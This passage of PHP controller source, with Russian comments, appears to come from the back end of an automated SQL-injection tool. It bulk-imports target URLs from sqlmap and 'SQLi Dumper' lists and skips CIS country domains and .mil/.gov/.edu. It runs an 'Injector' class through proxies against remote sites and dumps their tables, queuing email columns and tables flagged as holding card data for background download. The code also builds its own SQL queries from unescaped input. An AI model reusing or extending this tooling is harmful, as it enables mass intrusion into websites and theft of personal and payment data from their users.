		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'],$get['table'],explode(',',$get['field']),$count,$order,$get['where'],$filename);
		
		//$data3[$inject['posts_one']['id']]
        
       
        
        //foreach($data3 as $fff)
       // {
            
           // $col_str = implode(';',$fff);
            
            //fwrite($fh, trim($col_str)."\n");
             //$this->d($col_str,'imp');
        //}
		
		
		
		
		//$data = array('data'=>array($squle['Post']['id']=>$data3));
		
		
		
		$this->layout=false;

	
		
		//$this->render('viewdataone');
		
	}
	
    
    
	
	function gettable_one(){//выбирает одну таблицу из сессии для вывода в шаблоне
		
		$this->layout = FALSE;
		$fileds = $this->Session->read('field');
		$this->set('field',$fileds);	
		
	}
	
	function choisgetdata_one($param){ // При дампинге есть параметры количество записей и DESC ASK меняет их
		
		//$this->d($param,'$param');
		
		$val = $_POST;
		
		//$this->d($val,'$val');
		//exit;
		
		if(isset($_POST['data']))
		{
			$val = $_POST['data'];
		}
		$this->Session->write('get'.$param,$val[$param]);
		
		die();
	}
	
	function getcooldata_one_fone(){//дампит в фоне записывает задание в fileds_one get 1

		
		$order = array();
		
		$get['limit'] = intval($this->Session->read('getlimit'));
		
		
		
		
		if($get['limit'] =='' or empty($get['limit']))
		{
			$get['limit'] = 5;	
		}
		
		$t = explode('.',$this->Session->read('table'));
		
		$get['table'] = $t[1];
		
		$get['bd']	  =  $t[0];
		
		$get['where'] =  $this->Session->read('getwhere');
		
		$get['order'] =  $this->Session->read('getorder');
		
		$get['desc'] =  $this->Session->read('getdesc');
		
		//$this->d($get,'get');
		//exit;
		
		if($get['desc'] =='' or empty($get['desc']))
		{
			$get['desc'] = 0;
			
			
		}
		
		
		
		$get['field'] =  $this->Session->read('field');
		
		$this->d($get,'get');
		//exit;
		
		$data = $this->Session->read('inject');
		//$this->d($data,'$data');
		//exit;
		
		$squle['Post'] = $data['posts_one'];
		
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		
		$data2['id'] = $squle['Post']['id'];
		$data2['bd'] = $get['bd'];
		$data2['table'] = $get['table'];
		$data2['field'] = $get['field'];
		$bd = $data2['bd'];
		
		$bd2 = $bd.":".$data2['table'];
        
        $table = $data2['table'];
        
        $post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	
        
        
        $mailcount = $this->mysqlInj->mysqlGetCountInsert($data2['bd'],$table);
        
        $mailcount3 = "<span style='color:red; font-size:13px;font-weight:700;'>".$mailcount."</span>";	
        
        //$label = $data2['field'];
        
        $field = $data2['field'];
		
		$table = $data2['table'];
        
        $tt = explode(',',$field);
        
        
        $mail['COLUMN_NAME'] = $tt[0];
        
        $ipbase2 = 'IP:'.$data2['bd'].':'.$table.':'.$mail['COLUMN_NAME'];
						
	    $ipbase3 = 'IP:'.$data2['bd'].':'.$table."({$mailcount3})".':'.$mail['COLUMN_NAME'];
					

        $squle2 = $this->Post->query("SELECT * FROM  `fileds_one` WHERE  `post_id` =".$squle['Post']['id']." AND `table` ='".$data2['table']."'  limit 0,1" );
        
       // $this->d("SELECT * FROM  `fileds_one` WHERE  `post_id` =".$squle['Post']['id']." AND `table` ='".$data2['table']."'  limit 0,1" );
        
        

        

        
        if($squle2[0]['fileds_one']['id'] =='')
        {
            
            
            $label = $mail['COLUMN_NAME'];
                 

                 
            if($this->Post->query("INSERT INTO `fileds_one` 
								(`post_id`,`ipbase`,`ipbase2`,`table`,`label`,`filed`,`site`,`count`,`potok`)
								VALUES ($post_id,'$ipbase2','$ipbase2','$table','$label','$field','$url2',$mailcount,0)"))
							{
								echo $ipbase.' - Добавлен в обработку<br>';	
							}else
							{
								echo $ipbase.' - NO<br>';
                                
                                echo mysql_error();
                                
                                $this->d("INSERT INTO `fileds_one` 
								(`post_id`,`ipbase`,`ipbase2`,`table`,`label`,`filed`,`site`,`count`,`potok`)
								VALUES ($post_id,'$ipbase2','$ipbase2','$table','$label','$field','$url2',$mailcount,0)");
							}
        					
        }
           
       
        
        
		
		
		
		
		
            if($this->Post->query("UPDATE  `fileds_one` SET  `ipbase`='$ipbase2',`ipbase2`='$ipbase2', `get` =  '1',`pri`=1,`multi` = 1,`potok`=0,`filed`='".$data2['field']."' WHERE  `table` ='".$data2['table']."' AND `post_id` ='".$squle['Post']['id']."'"))
            {
                
                $this->Post->query("DELETE FROM `multis_one` WHERE `filed_id`=".$squle2[0]['fileds_one']['id']);
                
                echo "Мы вас поняли. скачивание БД начнемся в фоном режиме, если уже качали то перекачаем по новой !!!";
            }else{
                echo "Что то не ставится";
               // $this->d("UPDATE  `fileds_one` SET  `get` =  '1',`multi` = 1,`pri`=1, `filed`='".$data2['field']."' WHERE  `table` ='".$data2['table']."' AND `post_id` ='".$squle['Post']['id']."'");
                
            }
            
        
        
      
        
			
		
		

		
		
		
		
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		if($get['desc'] ==0 )
		{
			$this->mysqlInj->desc=0; // в обратном порядке
			$this->mysqlInj->desc_enable=true;
		}else{
			
			$this->mysqlInj->desc=1;//ask по идее
		}
		
		
		
			
		
		
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		

		//$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'],$get['table'],explode(',',$get['field']),$get['limit'],$order,$get['where']);
		
		
		
		//$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'],$get['table']);
		$this->Session->write('counttable',$count);
		
		
		$data = array('data'=>array($squle['Post']['id']=>$data3));
		
		
		
		$this->layout=false;

		$this->set('field',$this->Session->read('field'));
		
		//$this->set('counttable',$count);
		
		$this->set('dataCOLL',$data);
		
		$this->set('inject',$data);
		
		$this->render('viewdataone');
		
	}

	
    function viewdataone(){
		
		$order = array();
		
		$get['limit'] = intval($this->Session->read('getlimit'));
		
		
		if($get['limit'] =='' or empty($get['limit']))
		{
			$get['limit'] = 5;	
		}
		
		$t = explode('.',$this->Session->read('table'));
		
		$get['table'] = $t[1];
		
		$get['bd']	  =  $t[0];
		
		$get['where'] =  $this->Session->read('getwhere');
		
		$get['order'] =  $this->Session->read('getorder');
		
		$get['desc'] =  $this->Session->read('getdesc');
		
		//$this->d($get,'get');
		//exit;
		
		if($get['desc'] =='' or empty($get['desc']))
		{
			$get['desc'] = 0;
			
		
		}
		
		
		
		
		$get['field'] =  $this->Session->read('field');
		
		
		
		$data = $this->Session->read('inject');
		
		
		$squle['Post'] = $data['posts_one'];
		
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$this->d($set,'set');
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		if($get['desc'] ==0 )
		{
			$this->mysqlInj->desc=0; // в обратном порядке
			$this->mysqlInj->desc_enable=true;
		}else{
			
			$this->mysqlInj->desc=1;//ask по идее
		}
		
		//$this->mysqlInj->desc_enable;
		
			
			
		//$this->d($get,'get');
		//exit;	
			
		
		
		//exit;
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		
		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'],$get['table'],explode(',',$get['field']),$get['limit'],$order,$get['where']);
		
		$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'],$get['table']);
		
		$this->Session->write('counttable',$count);
		
		
		$data = array('data'=>array($squle['Post']['id']=>$data3));
		
		
		
		$this->layout=false;

		$this->set('field',$this->Session->read('field'));
		
		$this->set('counttable',$count);
		
		$this->set('dataCOLL',$data);
		
		$this->set('inject',$data);
		
		$this->render('viewdataone');
		
	}
	
	function viewdata_one(){//показ выборки

		$data = array('data'=>array(2=>array(0=>array('id'=>'11','date'=>'РґР¶РёРіСѓСЂРґР°!1'))));
		$this->layout=false;
		//		echo $counttable;

		$this->set('count',$this->Session->read('field'));
		$this->set('field',$this->Session->read('field'));
		$this->set('dataCOLL',$data);
		
	}
	
	function shlak_one($id){//удаляет из posts_one id
		
		$this->Post->query("DELETE FROM `posts_one` WHERE `id`=".$id);
		die();
		$this->redirect(array('action'=>'krutaten_one/'.$id));
	}
	
	function shlak_all($id){//удаляет из posts_one id
		
		$this->Post->query("DELETE FROM `posts_all` WHERE `id`=".$id);
		die();
		$this->redirect(array('action'=>'krutaten_one/'.$id));
	}
	
	function shlak_filed($id){//удаляет из fileds_one id
		
		
		
		$this->Post->query("DELETE FROM `fileds_one` WHERE `post_id`=".$id);
		
		$data = $this->Session->read('inject');
		
		$this->d($data);
		unset($data['emails']);
		$this->d($data,'data');
		//exit;
		
		$this->Session->write('inject',$data);
		//exit;
		//die();
		$this->redirect(array('action'=>'krutaten_one/'.$id));
	}
	
	function shlak_card_one($id){//удаляет из fileds_one id
		
		
		
		$this->Post->query("DELETE FROM `orders_one` WHERE `post_id`=".$id);
		
		$data = $this->Session->read('inject');
		
		//$this->d($data);
		unset($data['orders']);
		//	$this->d($data,'data');
		//exit;
		
		$this->Session->write('inject',$data);
		//exit;
		//die();
		$this->redirect(array('action'=>'krutaten_one/'.$id));
	}
	
	function shlak_domen($id){//удаляет из fileds_one id
		
		
		
		$this->Post->query("DELETE FROM `domens` WHERE `id`=".$id);
		
		$data = $this->Session->read('inject');
		
		//$this->d($data);
		unset($data['orders']);
		//	$this->d($data,'data');
		//exit;
		
		$this->Session->write('inject',$data);
		//exit;
		//die();
		$this->redirect(array('action'=>'order_domens/'.$id));
	}
	
	function shlak_domen_bad($id){//удаляет из fileds_one id
		
		
		
		$this->Post->query("DELETE FROM `domens` WHERE `id`=".$id);
		
		$data = $this->Session->read('inject');
		
		//$this->d($data);
		unset($data['orders']);
		//	$this->d($data,'data');
		//exit;
		
		$this->Session->write('inject',$data);
		//exit;
		//die();
		$this->redirect(array('action'=>'order_domens_bad/'.$id));
	}
	
	
	
	function shlak_cardTable_one($id){//удаляет таблицы с картами если нашло из кеша
		
		
		
		$this->Post->query("DELETE FROM `ordersTable_one` WHERE `post_id`=".$id);
		
		$data = $this->Session->read('inject');
		
		//$this->d($data);
		unset($data['ordersTable']);
		//	$this->d($data,'data');
		//exit;
		
		$this->Session->write('inject',$data);
		//exit;
		//die();
		$this->redirect(array('action'=>'krutaten_one/'.$id));
	}
	
	function shlak_bds($id){//удаляет из из кеша БД
		
		
		
		$this->Post->query("DELETE FROM `bds_one` WHERE `post_id`=".$id);
		
		$data = $this->Session->read('inject');
		
		//$this->d($data);
		unset($data['bds']);
		//$this->d($data,'data');
		//exit;
		
		$this->Session->write('inject',$data);
		//exit;
		//die();
		$this->redirect(array('action'=>'krutaten_one/'.$id));
	}
	
	function mysql_users_site_one($id){//вывод на страницу
		
		$data2 = $this->Post->query("SELECT * FROM  `m_users` WHERE `post_id`=".$id);
		
		
		$this->d($data2,'users');
		
	}
	
	function mysql_reconect($host,$user,$pass){
		
		
		$link = mysql_connect($host, $user, $pass);
		

		/* Assuming this query will take a long time */
		
 
		if (!$link) {
			$this->d(mysql_error(),"$host,$user,$pass");
			return FALSE;
		}else{
			
			return true;
		}
	}
	
	////////////////////////////////
	////////////////////////////////
	////////////////////////////////
	
	function add(){//добавление линков в базу bota по одному линку на сайт с дублями по домену
		
		set_time_limit(0);  
		
		if(isset($this->data))
		{ 
			
			
			//$this->d($this->data);
			
			if(isset($this->data['Post']['link2']) AND $this->data['Post']['link2'] !=''){
				
				$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/addlinks/";
				
				$name = rand(1,1000);
				$file = $ff.$name.'.txt';
				
				$link2 = str_replace('http://','',$this->data['Post']['link2']);
				$link2 = 'http://'.$link2;
				
				$files = file($link2);
				shuffle($files);
				
				//$this->d($files,'$files');
				//exit;
				
				if(count($files)> 1)
				{
					
					$fp = fopen ($file, "w");

					foreach ($files as $output)
					{
						if($output !='' or !empty($output))
						{
							fwrite($fp, $output);
						}
					}
					
					fclose($fp);
					
					$this->d('links s '.$link2.' dabavlenni v ochered');
					flush();
					//sleep(3);
					
					
				}
				
				$this->redirect(array('action'=>'add'));
				//exit;
				
			}
			
			if(isset($this->data['Post']['file_cron'])){
				
				$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/addlinks/";
				$name = rand(1,1000);
				if (copy($this->data['Post']['file_cron']['tmp_name'], $ff.$name.'.txt')) {
					echo "Файл добавлен в очередь";
				}
				
				//sleep(3);
				
				//$this->redirect(array('action'=>'add'));
				exit;
			}
			
			if($this->data['Post']['file_sqlmap'] !=''){
				
				$this->dd('Обычное добавление sqlmap');
				$this->add_sqlmap($this->data['Post']);
				exit;
			}
			
			if($this->data['Post']['sqli_dumper'] !=''){
				
				$this->dd('Обычное добавление');
				$this->add_dumper_links($this->data['Post']);
				exit;
			}
			
			if($this->data['Post']['file_one'] !=''){
				
				$this->dd('Обычное добавление');
				$this->add_one_links($this->data['Post']);
				exit;
			}
			
				$files = file($this->data['Post']['add']['tmp_name']);
			
			
			//$this->d($files,'$files');

			shuffle($files);
			
			$this->dd(count($files),'VSEGO linkov');
			$lll = array();
			$i=0;
			$pusto = 0;
			$zapret = 0;
			$k = 0;
			$k2 = 0;
			$k3=0;

			
			
			
			
			
			
			foreach ($files as $value)
			{
				
				
				if(strlen($value) >500){
					
					$fileopen3=fopen("links/dlinie_bad.tx","a+");
					fwrite($fileopen3,$value."\r\n");
					fclose($fileopen3);
					continue;
				}
				
				
				$value = str_replace('http://http://','http://',$value);
				$value = str_replace('https://https://','https://',$value);
				
			
				$value = str_replace('WWW.','www.',$value);
				$value = str_replace('wwwwww.','www.',$value);
				$value = str_replace('wwwwww','www',$value);
				
				
				if(stristr($value,'https')){
					$value = str_replace('https://','',$value);
					$value = 'https://'.str_replace('%26', '&', $value);
				}else{
					 $value = str_replace('http://','',$value);
					 $value = 'http://'.str_replace('%26', '&', $value);
				}
					
				//$value = str_replace('//','/',$value);
				$value =  trim($value);
				
				
				//$this->d($value,'value');
				
				if(preg_match("/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+\//i",$value,$match)){
					
					$k3++;
					$fileopen=fopen("links/zona_bad.tx","a+");
					fwrite($fileopen,$value."\r\n");
					fclose($fileopen);
					
					continue;
				}
				
				
				
				
				$value2=$value;
				$value2 = str_replace($this->engeen_addr, 'DICK!', $value2);
				
				if(strstr($value2,'DICK!') or !strstr($value2,'?'))
				{
					$zapret++;
					
					$fileopen=fopen("links/zapret_bad.txt","a+");
					fwrite($fileopen,$value."\r\n");
					fclose($fileopen);
					
					continue;
					
				}
				
				
			
				
				$data =  parse_url($value);
				
				$host = $data['host'];
				
				$query = $data['query'];
				
				$path = $data['path'];
				
			
				
				
				//$this->d($data);
				//$this->d($value,'$value');
				//exit;
				
				$new[] = trim($value);

				
			}
			
		

			
							
			
			
		
			
			$this->dd($k3,'zapreshenie zony /app/webroot/addlinks/zapret.txt');
			
			$this->dd(count($new),'LINKOV PRIGODNYH DLYA VSTAVKI V BD ');	
			
			$this->dd($zapret,'V URL EST ZAPRESHENIE SLOVA '."'tube','google','topic=','modules.php','act=Help','module=forums','module=help','name=News','forum'  /app/webroot/addlinks/bad.txt");	
			
			
		
			
		
			//$this->d($new,'$new');
			
		//	exit;
			
			
			foreach ($new as $file)
			{
				
				
				if(preg_match("/get::/i",$file))
				{
					$file = str_replace('get::','',$file);	
					$header = 'get';
				}elseif(preg_match("/post::/i",$file)){
					$file = str_replace('post::','',$file);	
					$header = 'post';
				}else{
					$header = 'get';
				}
				
				$data = parse_url($file);
				
				$host = $data['host'];
				
				$query = $data['query'];
				
				$path = $data['path'];
				
				$domen = trim($data['host']);
				
				$domen = str_replace('www.','',$domen);
				$domen = str_replace('wwwwww.','',$domen);
				$domen = str_replace('wwwwww','',$domen);
				
				
				
				flush();
				
				
				if(strstr($file,'asp') or strstr($file,'cfm')){
					$type = 'asp';
					}else{
						$type='';
					}
					
					
				$id = 0;
				
				$date = date('Y-m-d h:i:s');
				
				$tic = 0;
				
				$maska = $this->get_arg_url($file);
				
				$url = $file;
				
				
					
				if(stristr($url,'https')){
					$http='https';
				}else{
					$http='http';
				}
				
				
				$url = str_replace('https://','',$url);
				$url = str_replace('http://','',$url);
				
				
			
				
				
				$ff = $this->Injector->urlParseUrl3($url);
				
				$path_query = $domen.':'.$path.':'.$ff;
		
				$count = $this->Filed->query("select count(*) FROM `posts_all` WHERE `domen` like '%$domen%'");
				
				$ccc = $count[0][0]['count(*)'];
				

			
				
				//$this->d($count,'$count');
				//$this->d($this->$domen,'$this->$domen');
				
				
				if($this->$domen < $this->link_count AND $ccc < $this->link_count)
				{
					
					if($this->Post->query("INSERT INTO `posts_all` 
					(`url`,`date`,`maska`,`domen`,`tic`,`path_query`,`path`,`query`,`get_type`,`http`,`header`)
					VALUES ('$url','$date','$maska','$domen','$tic','$path_query','$path','$query','$type','$http','$header')"))
					{
						
						$this->$domen = $this->$domen+1;
						$k++;
						//echo $url.' - OK<br>';
						
							
							
					}else
					{
						//$this->d(mysql_error());
						//echo $file.'  --  '.$domen." NO !!!!!!<br>";
						$k2++;
						
						$fileopen=fopen("links/dubli.txt","a+");
						fwrite($fileopen,$url."\r\n");
						fclose($fileopen);
						
					}
					
					
				
				}else{
					//fwrite($fp, $url."\r\n");
					
				}	
					
				flush();
				
				
				
				
					//$this->d($file,'file');
				
			}
			
			
			$this->dd($k,'DABAVLENO V BASU');
			$this->dd($k2,'NE DABAVLENO V BASU (DUBLI)');
			
			
			
			//$this->redirect(array('action'=>'index'));
			
			
		}
		


	}
	
	function add_one_links($fff){//обычное добавление
		
			
			
		//	$this->d($fff,'$fff');
			
			$files = file($fff['file_one']['tmp_name']);
			

			//shuffle($files);
			
			$this->dd(count($files),'VSEGO linkov');
			$lll = array();
			$i=0;
			$pusto = 0;
			$zapret = 0;
			$k = 0;
			$k2 = 0;
			$k3=0;

			
			foreach ($files as $value)
			{
				
				
				
				
				if($value =='')
				{	
					$pusto++;
					continue;
				}
				
				if(strlen($value) >500){
					
					$fileopen3=fopen("links/dlinie_bad.tx","a+");
					fwrite($fileopen3,$value."\r\n");
					fclose($fileopen3);
					continue;
				}
				
				
				if($value =='')
				{	
					$pusto++;
					continue;
				}
				
				$value = str_replace('*','',$value);
				
				$value = str_replace('[t]','',$value);
				
				
				
				$value = str_replace('http://http://','http://',$value);
				$value = str_replace('https://https://','https://',$value);
				
				
				
				$value = str_replace('WWW.','www.',$value);
				$value = str_replace('wwwwww.','www.',$value);
				$value = str_replace('wwwwww','www',$value);
				
				
				if(stristr($value,'https')){
					$value = str_replace('https://','',$value);
					$value = 'https://'.str_replace('%26', '&', $value);
				}else{
					 $value = str_replace('http://','',$value);
					 $value = 'http://'.str_replace('%26', '&', $value);
				}
					
				//$value = str_replace('//','/',$value);
				$value =  trim($value);
				
				
				
				if(preg_match("/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+\//i",$value,$match)){
				//if(preg_match("/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+\//i",$value,$match)){
					
                   // $this->d($value,'value222');
                    
					$k3++;
					$fileopen=fopen("links/zona_bad.tx","a+");
					fwrite($fileopen,$value."\r\n");
					fclose($fileopen);
					
					continue;
				}
				
				//exit;
				
				
				$value2=$value;
				$value2 = str_replace($this->engeen_addr, 'DICK!', $value2);
				
				if(strstr($value2,'DICK!') or !strstr($value2,'?'))
				{
					$zapret++;
					
					$fileopen=fopen("links/zapret_bad.txt","a+");
					fwrite($fileopen,$value."\r\n");
					fclose($fileopen);
					
					continue;
					
				}
				
				$data =  parse_url($value);
				
				$host = $data['host'];
				
				$query = $data['query'];
				
				$path = $data['path'];
				
				
				
				
				$new[] = $value;
				
			
				
				
				//$this->d($data);
				//$this->d($new,'new');
				//exit;
				
				

				
			}
			
		

					
						
							
			
			
		
			
			$this->dd($k3,'zapreshenie zony /app/webroot/addlinks/zapret.txt');
			
			$this->dd(count($new),'LINKOV PRIGODNYH DLYA VSTAVKI V BD');	
			
			$this->dd($zapret,'V URL EST ZAPRESHENIE SLOVA '."'tube','google','topic=','modules.php','act=Help','module=forums','module=help','name=News','forum' /app/webroot/addlinks/bad.txt");	
			
			
		
			
		
			//$this->d($new,'$new');
			
			//exit;
			
			
			foreach ($new as $file)
			{
				
				if(preg_match("/get::/i",$file))
				{
					$file = str_replace('get::','',$file);	
					$header = 'get';
				}elseif(preg_match("/post::/i",$file)){
					$file = str_replace('post::','',$file);	
					$header = 'post';
				}else{
					$header = 'get';
				}
				
				
				$data = parse_url($file);
				
				$host = $data['host'];
				
				$query = $data['query'];
				
				$path = $data['path'];
				$path = str_replace('*','[t]',$path);
				
				$domen = trim($data['host']);
				$domen = str_replace('*','',$domen);
				$domen = str_replace('www.','',$domen);
				$domen = str_replace('wwwwww.','',$domen);
				$domen = str_replace('wwwwww','',$domen);
				
				
				
				flush();
				
				
				if(strstr($file,'asp') or strstr($file,'cfm')){
					$type = 'asp';
					}else{
						$type='';
					}
					
					
				$id = 0;
				
				$date = date('Y-m-d h:i:s');
				
				$tic = 0;
				
				$maska = $this->get_arg_url($file);
				
				$url = $file;
				
				
					
				if(stristr($url,'https')){
					$http='https';
				}else{
					$http='http';
				}
				
				
				$url = str_replace('https://','',$url);
				$url = str_replace('http://','',$url);
				
				
			
				
				
				$ff = $this->Injector->urlParseUrl3($url);
				$ff = str_replace('*','[t]',$ff);
				$path_query = $domen.':'.$path.':'.$ff;
		
				
					
					if($this->Post->query("INSERT INTO `posts` 
					(`url`,`date`,`maska`,`domen`,`tic`,`get_type`,`http`,`header`)
					VALUES ('$url','$date','$maska','$domen','$tic','$type','$http','$header')"))
					{
						
						$this->$domen = $this->$domen+1;
						$k++;
						//echo $url.' - OK<br>';
						
							
							
					}else
					{
						//$this->d(mysql_error());
						//echo $file.'  --  '.$domen." NO !!!!!!<br>";
						$k2++;
						
						$fileopen=fopen("links/dubli.txt","a+");
						fwrite($fileopen,$url."\r\n");
						fclose($fileopen);
						
					}
					
					flush();
				

					//$this->d($file,'file');
				
			}
			
			
			$this->dd($k,'DABAVLENO V BASU');
			$this->dd($k2,'NE DABAVLENO V BASU (DUBLI)');
			
			
			
			//$this->redirect(array('action'=>'index'));
			
		

	}
	
	function add_sqlmap($fff){//обычное добавление
		
			
			
		//	$this->d($fff,'$fff');
			
			$files = file($fff['file_sqlmap']['tmp_name']);
			

			shuffle($files);
			
			$this->dd(count($files),'VSEGO linkov');
			$lll = array();
			$i=0;
			$pusto = 0;
			$zapret = 0;
			$k = 0;
			$k2 = 0;
			$k3=0;

			
			foreach ($files as $value)
			{
				
				
				
				
				if($value =='')
				{	
					$pusto++;
					continue;
				}
				
				
				if($value =='')
				{	
					$pusto++;
					continue;
				}
				
				$value = str_replace('*','',$value);
				
				$value = str_replace('[t]','',$value);
				
				
				
				$value = str_replace('http://http://','http://',$value);
				$value = str_replace('https://https://','https://',$value);
				
				
				
				$value = str_replace('WWW.','www.',$value);
				$value = str_replace('wwwwww.','www.',$value);
				$value = str_replace('wwwwww','www',$value);
				
				
				if(stristr($value,'https')){
					$value = str_replace('https://','',$value);
					$value = 'https://'.str_replace('%26', '&', $value);
				}else{
					 $value = str_replace('http://','',$value);
					 $value = 'http://'.str_replace('%26', '&', $value);
				}
					
				//$value = str_replace('//','/',$value);
				$value =  trim($value);
				
				
				//$this->d($value,'value');
				
				if(preg_match("/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+\//i",$value,$match)){
					
					$k3++;
					$fileopen=fopen("links/zona_bad.tx","a+");
					fwrite($fileopen,$value."\r\n");
					fclose($fileopen);
					
					continue;
				}
				
				
				
				
				$value2=$value;
				$value2 = str_replace($this->Injector->engeen_addr, 'DICK!', $value2);
				
				if(strstr($value2,'DICK!') or !strstr($value2,'?'))
				{
					$zapret++;
					
					$fileopen=fopen("links/zapret_bad.txt","a+");
					fwrite($fileopen,$value."\r\n");
					fclose($fileopen);
					
					continue;
					
				}
				
				$data =  parse_url($value);
				
				$host = $data['host'];
				
				$query = $data['query'];
				
				$path = $data['path'];
				
				
				
				
				$new[] = $value;
				
			
				
				
				//$this->d($data);
				//$this->d($new,'new');
				//exit;
				
				

				
			}
			
		

					
						
							
			
			
		
			
			$this->dd($k3,'zapreshenie zony /app/webroot/addlinks/zapret.txt');
			
			$this->dd(count($new),'LINKOV PRIGODNYH DLYA VSTAVKI V BD');	
			
			$this->dd($zapret,'V URL EST ZAPRESHENIE SLOVA '."'tube','google','topic=','modules.php','act=Help','module=forums','module=help','name=News','forum' /app/webroot/addlinks/bad.txt");	
			
			
		
			
		
			//$this->d($new,'$new');
			
			//exit;
			
			
			foreach ($new as $file)
			{
				
				if(preg_match("/get::/i",$file))
				{
					$file = str_replace('get::','',$file);	
					$header = 'get';
				}elseif(preg_match("/post::/i",$file)){
					$file = str_replace('post::','',$file);	
					$header = 'post';
				}else{
					$header = 'get';
				}
				
				
				$data = parse_url($file);
				
				$host = $data['host'];
				
				$query = $data['query'];
				
				$path = $data['path'];
				$path = str_replace('*','[t]',$path);
				
				$domen = trim($data['host']);
				$domen = str_replace('*','',$domen);
				$domen = str_replace('www.','',$domen);
				$domen = str_replace('wwwwww.','',$domen);
				$domen = str_replace('wwwwww','',$domen);
				
				
				
				flush();
				
				
				if(strstr($file,'asp') or strstr($file,'cfm')){
					$type = 'asp';
					}else{
						$type='';
					}
					
					
				$id = 0;
				
				$date = date('Y-m-d h:i:s');
				
				$tic = 0;
				
				$maska = $this->get_arg_url($file);
				
				$url = $file;
				
				
					
				if(stristr($url,'https')){
					$http='https';
				}else{
					$http='http';
				}
				
				
				$url = str_replace('https://','',$url);
				$url = str_replace('http://','',$url);
				
				
			
				
				
				$ff = $this->Injector->urlParseUrl3($url);
				$ff = str_replace('*','[t]',$ff);
				$path_query = $domen.':'.$path.':'.$ff;
		
				
					
					if($this->Post->query("INSERT INTO `posts` 
					(`url`,`date`,`maska`,`domen`,`tic`,`get_type`,`http`,`header`,`sqlmap_check`)
					VALUES ('$url','$date','$maska','$domen','$tic','$type','$http','$header',1)"))
					{
						
						$this->$domen = $this->$domen+1;
						$k++;
						//echo $url.' - OK<br>';
						
							
							
					}else
					{
						//$this->d(mysql_error());
						//echo $file.'  --  '.$domen." NO !!!!!!<br>";
						$k2++;
						
						$fileopen=fopen("links/dubli.txt","a+");
						fwrite($fileopen,$url."\r\n");
						fclose($fileopen);
						
					}
					
					flush();
				

					//$this->d($file,'file');
				
			}
			
			
			$this->dd($k,'DABAVLENO V BASU');
			$this->dd($k2,'NE DABAVLENO V BASU (DUBLI)');
			
			
			
			//$this->redirect(array('action'=>'index'));
			
		

	}
		
	function add_all_to_posts(){ // добавление линков из общей таблицы в обычный posts  VERSION 4.0

	mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/links/");

	
	if($this->head_check ==true){
		$posts = $this->Post->query("SELECT * FROM `posts` WHERE `status`=11"); // после чека на  head
		
	}else{
			$posts = $this->Post->query("SELECT * FROM `posts` WHERE `status`=1"); // не будут на head чекаться и сразу удаляться
		
	}
	
	
		foreach ($posts as $one)
		{
		
			
					//$this->d($one,'one');
				
					if($this->Post->query("DELETE FROM `posts` WHERE `id`=".$one['posts']['id']))
					{
						
						$this->d('delte '.$one['posts']['url']);
						
						$fileopen=fopen($this->links_bad, "a+");
						fwrite($fileopen,$one['posts']['url']."\r\n");
						fclose($fileopen);
					}
				
		}
	
	

	
	
	//exit;

	$file = $this->Post->query("SELECT count(*) as count FROM `posts_all` WHERE `check_posts`=0");

	if(intval($file[0][0]['count'])!==0)
		{		
			$this->timeStart = $this->start('add_all_to_posts',1);
		}else
		{
			die('TimeStart');
		}	

		$file100 = $this->Post->query("SELECT * FROM `posts_all` WHERE `check_posts`=0 GROUP BY `domen` ");
		
		
		//$this->d($file100,'$file100');
		
		//shuffle($file100);
		
	
	foreach ($file100 as $val100)
	{
		$id 	= $val100['posts_all']['id'];
		$url 	= $val100['posts_all']['url'];
		$domen	= $val100['posts_all']['domen'];
		$type	= $val100['posts_all']['type'];
		$maska	= $val100['posts_all']['maska'];
		$type	= $val100['posts_all']['get_type'];		
		$date   = $val100['posts_all']['date'];		
		$http   = $val100['posts_all']['http'];		
	
		
		
		$check_d = $this->Post->query("SELECT * FROM `posts` WHERE `domen` like '%$domen%' limit 1");
		
		$post_id = $check_d['posts']['id'];
		$post_url = $check_d['posts']['url'];
		
		
		
		if(count($check_d) <1)
		{
		
	
			if($this->Post->query("INSERT INTO `posts` 
			(`url`,
			`date`,
			`maska`,
			`domen`,
			`tic`,
			`get_type`,
			`http`)
			VALUES ('$url','$date','$maska','$domen','0','$type','$http')"))
			{
				if($this->Post->query("UPDATE  `posts_all` SET  `check_posts` =  1 WHERE  `id` =$id "))
				{
					echo $url.' - OK<br>';
				
				}
				
				
				
					
					
			}else
			{
				//$this->d(mysql_error());
				echo $url.'  --  '.$domen." NO !!!!!!<br>";

			}
		
		}		
	}
	$this->stop();
}	

	function add_one(){//добавление линков в базу bota по одному линку на сайт с дублями по домену
		
		
		
		
		if(isset($this->data))
		{ 
			
			if($this->data['Post']['link'] !='')
			{
				
				$value = $this->data['Post']['link'];
				$value = trim($value);
				
			}else{
				$this->d('dabavte link');
				exit;
			}
			
			$value_orig = $value;
			
			$value_orig = str_replace('post::','',$value_orig);
			
			if(stristr($value,'https') OR stristr($value,'http'))
			{
				$data =   parse_url($value_orig);
			}else{
				$data =   parse_url('http://'.$value_orig);
